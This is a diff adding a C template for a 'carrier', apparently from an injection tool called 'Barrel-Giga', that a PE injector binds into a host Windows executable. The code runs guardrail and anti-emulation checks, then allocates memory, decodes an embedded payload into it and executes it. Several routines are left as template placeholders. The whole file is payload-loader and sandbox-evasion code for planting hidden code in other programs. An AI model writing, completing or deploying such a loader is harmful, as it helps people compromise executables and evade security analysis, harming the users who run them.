@@ -1,0 +1,145 @@
+/*
+ * Barrel-Giga compiler-neutral carrier.
+ *
+ * This intentionally avoids the CRT, global mutable data, and absolute data
+ * references. A toolchain backend derives import, payload, and data fixups which
+ * the PE injector binds to the host image.
+ */
+
+typedef unsigned char BYTE;
+typedef unsigned short WORD;
+typedef unsigned long DWORD;
+typedef unsigned long long SIZE_T;
+typedef unsigned long long ULONGLONG;
+typedef signed long long LONGLONG;
+typedef unsigned short wchar_t;
+typedef int BOOL;
+typedef void *PVOID;
+typedef void *HANDLE;
+typedef void *HWND;
+typedef void *HMODULE;
+typedef const char *LPCSTR;
+
+#if defined(__GNUC__)
+#define SG_IMPORT __attribute__((dllimport))
+#define SG_NORETURN __attribute__((noreturn))
+#define SG_CDECL __attribute__((cdecl))
+#define WINAPI __attribute__((stdcall))
+#else
+#define SG_IMPORT __declspec(dllimport)
+#define SG_NORETURN __declspec(noreturn)
+#define SG_CDECL __cdecl
+#define WINAPI __stdcall
+#endif
+#define NULL ((void *)0)
+
+SG_IMPORT PVOID WINAPI VirtualAlloc(PVOID, SIZE_T, DWORD, DWORD);
+SG_IMPORT BOOL WINAPI VirtualFree(PVOID, SIZE_T, DWORD);
+SG_IMPORT BOOL WINAPI VirtualProtect(PVOID, SIZE_T, DWORD, DWORD *);
+SG_IMPORT BOOL WINAPI FlushInstructionCache(HANDLE, const void *, SIZE_T);
+SG_IMPORT HANDLE WINAPI CreateThread(
+    PVOID, SIZE_T, DWORD (WINAPI *)(PVOID), PVOID, DWORD, DWORD *);
+SG_IMPORT DWORD WINAPI WaitForSingleObject(HANDLE, DWORD);
+SG_IMPORT BOOL WINAPI CloseHandle(HANDLE);
+SG_IMPORT void WINAPI Sleep(DWORD);
+SG_IMPORT DWORD WINAPI GetCurrentThreadId(void);
+SG_IMPORT HANDLE WINAPI OpenThread(DWORD, BOOL, DWORD);
+SG_IMPORT DWORD WINAPI SuspendThread(HANDLE);
+SG_IMPORT HMODULE WINAPI LoadLibraryA(LPCSTR);
+SG_IMPORT PVOID WINAPI GetProcAddress(HMODULE, LPCSTR);
+SG_IMPORT DWORD WINAPI GetEnvironmentVariableW(
+    const wchar_t *, wchar_t *, DWORD);
+SG_IMPORT int WINAPI MessageBoxW(HWND, const wchar_t *, const wchar_t *, unsigned int);
+SG_IMPORT SG_NORETURN void WINAPI ExitProcess(unsigned int);
+
+extern const BYTE supergiga_payload[];
+extern BYTE supergiga_destination[];
+
+static const BYTE *sg_payload_address(void)
+{
+#if defined(__GNUC__)
+    const BYTE *address;
+    __asm__ volatile (
+        "leaq supergiga_payload(%%rip), %0"
+        : "=r" (address));
+    return address;
+#else
+    return supergiga_payload;
+#endif
+}
+
+static BYTE *sg_destination_address(void)
+{
+#if defined(__GNUC__)
+    BYTE *address;
+    __asm__ volatile (
+        "leaq supergiga_destination(%%rip), %0"
+        : "=r" (address));
+    return address;
+#else
+    return supergiga_destination;
+#endif
+}
+
+typedef int (WINAPI *SG_MESSAGE_BOX_W)(HWND, const wchar_t *, const wchar_t *, unsigned int);
+
+typedef struct _SG_CARRIER_CONTEXT {
+    DWORD version;
+    SG_MESSAGE_BOX_W message_box_w;
+} SG_CARRIER_CONTEXT;
+
+typedef DWORD (SG_CDECL *SG_PAYLOAD_FN)(SG_CARRIER_CONTEXT *);
+typedef DWORD (WINAPI *SG_THREAD_START)(PVOID);
+
+static DWORD sg_carrier_run(void);
+
+{{ fragments.guardrail }}
+
+{{ fragments.anti_emulation }}
+
+{{ fragments.memory }}
+
+{{ fragments.decoder }}
+
+{{ fragments.execute }}
+
+{{ fragments.pe_invoke }}
+
+static DWORD sg_carrier_run(void)
+{
+    PVOID destination;
+    SG_CARRIER_CONTEXT context;
+    DWORD memory_state;
+    DWORD payload_result;
+
+    if (!sg_guardrail_allows()) {
+        return sg_fail(0xE0010001UL);
+    }
+    if (!sg_anti_emulation_allows()) {
+        return sg_fail(0xE0010004UL);
+    }
+
+    memory_state = 0;
+    destination = sg_memory_allocate(
+        (SIZE_T){{ payload_len }},
+        &memory_state);
+    if (destination == NULL) {
+        return sg_fail(0xE0010002UL);
+    }
+
+    sg_decode_copy(
+        (BYTE *)destination,
+        sg_payload_address(),
+        (SIZE_T){{ payload_len }});
+    if (!sg_memory_finalize(
+            destination,
+            (SIZE_T){{ payload_len }},
+            memory_state)) {
+        return sg_fail(0xE0010003UL);
+    }
+
+    context.version = 1;
+    context.message_box_w = sg_message_box_w;
+    payload_result = sg_execute(destination, &context);
+    return sg_finish(payload_result);
+}
